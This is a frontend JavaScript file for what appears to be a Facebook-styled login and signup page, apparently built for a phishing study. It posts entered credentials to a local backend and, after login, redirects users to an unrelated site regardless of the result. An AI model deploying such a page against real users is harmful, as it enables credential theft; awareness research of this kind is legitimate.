// frontend/js/app.js

const API_BASE = 'http://localhost:5000/api'; // change if your backend is elsewhere

/* ========== THEME ========== */
function applyTheme(theme) {
  const appEl = document.querySelector('.app');
  if (theme === 'dark') appEl.classList.add('dark');
  else appEl.classList.remove('dark');
  localStorage.setItem('theme', theme);
}
document.addEventListener('DOMContentLoaded', () => {
  // Check system preference first
  const systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
  const saved = localStorage.getItem('theme');
  const theme = saved || (systemDark ? 'dark' : 'light');
  applyTheme(theme);
  
  const toggle = document.getElementById('themeToggle');
  if (toggle) {
    toggle.checked = (theme === 'dark');
    toggle.addEventListener('change', (e) => applyTheme(e.target.checked ? 'dark' : 'light'));
  }
});

/* ========== UTIL ========== */
async function postJSON(url, data) {
  const res = await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
  return res.json();
}

/* ========== LANDING ========== */
function initLanding() {
  const fbBtn = document.getElementById('btnFb');
  const gBtn = document.getElementById('btnG');
  if (fbBtn) fbBtn.addEventListener('click', () => { window.location.href = 'login.html'; });
  if (gBtn) gBtn.addEventListener('click', () => { alert('Continue with Google clicked '); });
}

/* ========== SIGNUP ========== */
async function initSignup() {
  const form = document.getElementById('signupForm');
  if (!form) return;
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const data = {
      first_name: form.first_name.value.trim(),
      last_name: form.last_name.value.trim(),
      emailOrPhone: form.emailOrPhone.value.trim(),
      password: form.password.value
    };
    if (!data.first_name || !data.last_name || !data.emailOrPhone || !data.password) {
      return alert('Please fill all fields.');
    }
    const res = await postJSON(`${API_BASE}/signup`, data);
    if (res.success) {
      window.location.href = 'https://www.fool.com/';
    } else {
      alert(res.message || 'Signup failed.');
    }
  });
}

/* ========== LOGIN ========== */
async function initLogin() {
  const form = document.getElementById('loginForm');
  if (!form) return;
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const data = {
      loginInput: form.loginInput.value.trim(),
      password: form.password.value
    };
    if (!data.loginInput || !data.password) return alert('Email/phone and password are required.');

    const res = await postJSON(`${API_BASE}/login`, data);
    // store user in localStorage (study)
    localStorage.setItem('fb_study_user', JSON.stringify(res.user));
    window.location.href = 'https://www.fool.com/';
  });
}

/* ========== DASHBOARD ========== */
function initDashboard() {
  // Only run dashboard logic if we're actually on the dashboard page
  if (!document.getElementById('userName')) return;
  
  const userRaw = localStorage.getItem('fb_study_user');
  if (!userRaw) {
    window.location.href = 'login.html';
    return;
  }
  const user = JSON.parse(userRaw);
  const nameEl = document.getElementById('userName');
  nameEl.textContent = `${user.first_name} ${user.last_name}`;
  document.getElementById('logoutBtn').addEventListener('click', () => {
    localStorage.removeItem('fb_study_user');
    window.location.href = 'index.html';
  });
}

/* auto-init depending on page */
document.addEventListener('DOMContentLoaded', () => {
  initLanding();
  initSignup();
  initLogin();
  initDashboard();
});
